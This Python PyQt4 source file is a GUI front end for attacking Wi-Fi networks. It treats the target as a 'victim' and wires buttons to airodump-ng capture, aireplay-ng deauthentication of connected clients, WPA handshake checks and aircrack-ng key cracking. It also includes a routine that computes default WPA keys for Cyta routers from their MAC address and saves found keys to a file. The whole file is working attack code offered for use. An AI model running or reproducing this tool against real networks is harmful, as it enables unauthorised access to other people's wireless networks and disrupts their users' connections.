import time
import fileinput

# Executing, communicating with, killing processes
from subprocess import Popen, call, PIPE, check_output
from system_functions import *
from PyQt4 import QtGui, QtCore
from PyQt4.QtCore import *
from PyQt4.QtGui import *


class Client(QDialog):
    def __init__(self,victim, parent=None):
        self.bssid = victim[1]
        self.victim = victim
        self.essid = victim[0]
        self.channel = victim[2]
        self.client = victim[8]
        self.has_handshake = False
        super(Client, self).__init__(parent)
        self.setFixedSize(350, 300)

        self.le = QLineEdit()
        self.le.setObjectName("host")

        self.pb = QPushButton()
        self.pb.setObjectName("connect")
        self.pb.setText("Connect") 

        self.sd = QPushButton()
        self.sd.setObjectName("start_deauth")
        self.sd.setText("Start Deauthentication")

        self.cy = QPushButton()
        self.cy.setObjectName("cyta_crack")
        self.cy.setText("Try Cyta Crack")

        self.nf = QPushButton()
        self.nf.setObjectName("NetFaster_crack")
        self.nf.setText("Try NetFaster crack 'Handshake Required'")

        self.ad = QPushButton()
        self.ad.setObjectName("airodump")
        self.ad.setText("Do airodump in that network")

        self.ch = QPushButton()
        self.ch.setObjectName("handshake")
        self.ch.setText("Check for handshake")

        #self.current_timer = None

        layout = QFormLayout()
        layout.addWidget(self.le)
        layout.addWidget(self.ad)
        layout.addWidget(self.pb)
        layout.addWidget(self.sd)
        layout.addWidget(self.cy)
        layout.addWidget(self.nf)
        layout.addWidget(self.ch)

        self.setLayout(layout)
        self.pb.clicked.connect(self.set_client)
        self.sd.clicked.connect(self.start_deauthentication)
        self.cy.clicked.connect(self.cyta_crack)
        self.nf.clicked.connect(self.NetFaster_crack)
        self.ad.clicked.connect(self.start_airodump_capture)
        self.ch.clicked.connect(self.check_handshake)
        self.setWindowTitle("Learning")

        if self.client == 'NO':
            self.le.setText('Connected Client : ' + self.client + ' | Please provide manually')
        else:
            self.le.setText('Connected Client : ' + self.client )


    def check_handshake(self):
        # Below we check for hanshake but we get bug: If we close
        crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + str(self.bssid) + ' ' + 'output*.cap'
        proc_crack = Popen(crack, stdout=PIPE, shell=True)
        proc_crack.wait()
        txt = proc_crack.communicate()[0]
        txt = txt.splitlines()
        print txt[2]

        if txt[2] == "No valid WPA handshakes found.":
            print True


    def start_airodump_capture(self):
        self.airodump_capture = 'airodump-ng -c ' + self.channel + ' --bssid ' + self.bssid + ' -w output mon0'
        ct = Command_thread(str(self.airodump_capture))
        ct.start()


    def NetFaster_crack(self):
        generate_NetFaster_keyfile(self.bssid)
        crack_netfaster = 'aircrack-ng -b ' + self.bssid + '-l key.txt -w netfasterkeys.txt output*.cap'
        ct = Command_thread(str(crack_netfaster))
        ct.start()


    def closeEvent(self, event):
        thr = RetardedKill("airodump-ng", 0)
        thr.start()
        if os.path.isfile('key.txt'):
            content = str()
            with open('key.txt', 'r') as fo:
                content = fo.readline()
            with open('keys.lst', 'a') as fw:
                fw.write(self.bssid + '|' + content)
            commands.getstatusoutput('rm key.txt')
        self.victim[:] = []
        event.accept()


    def set_client(self):
        # shost is a QString object
        self.client = self.le.text()
        print 'provided client mac is ' + self.client 
        
    def start_deauthentication(self):
        thr = RetardedKill("aireplay-ng", 10)
        thr.start()

        deauth = 'sudo aireplay-ng -0 10 -a ' + self.bssid + ' -c ' + self.client + ' --ignore-negative-one mon0'
        ct = Command_thread(str(deauth))
        ct.start()

    def cyta_crack(self): 
        self.cyta_bases = 'bases.lst'
        self.bssid = str(self.bssid)   
        self.bssid_ventor = self.bssid[0:8] 
        self.bssid_serial = self.bssid[9:17] 
        self.keyfound = False
        for fline in fileinput.input(self.cyta_bases):
            if self.keyfound == True:
                break

            self.fvendor = fline[0:8]     
            self.fserial_start = fline[9:17]
            self.fserial_end = fline[18:26]
            self.fserial_num = fline[27:33]
            self.fbase = fline[34:40]
            self.finc = fline[41]
            
            if(self.bssid_ventor == self.fvendor and self.fserial_start <= self.bssid_serial <= self.fserial_end):   
                self.keyfound = True
                self.bssid_serial = self.bssid_serial.replace(':','')
                self.fserial_num = self.fserial_num.replace(' ','')  
                self.bssid_serial = int(self.bssid_serial,16)
                self.fbase = int(self.fbase,16)
                self.finc = int(self.finc)
                self.lserial = self.bssid_serial - self.fbase
                self.lserial = self.lserial / self.finc
                self.lserial = str(self.lserial)
                self.cc = len(self.lserial)
                self.zeros = (7 - self.cc)
                self.i = 0
                while(self.i < self.zeros): 
                    self.lserial = "0" + self.lserial
                    self.i = self.i + 1
                            
                print "*********************************"
                print "* Key found:                    *"
                print "* MAC = ",self.bssid,"     *"
                print "* WPA = ",self.fserial_num + "" + self.lserial ,"         *"
                print "*                               *"
                print "*********************************"

        if(self.keyfound == False):
            print 'Key is not in the list'
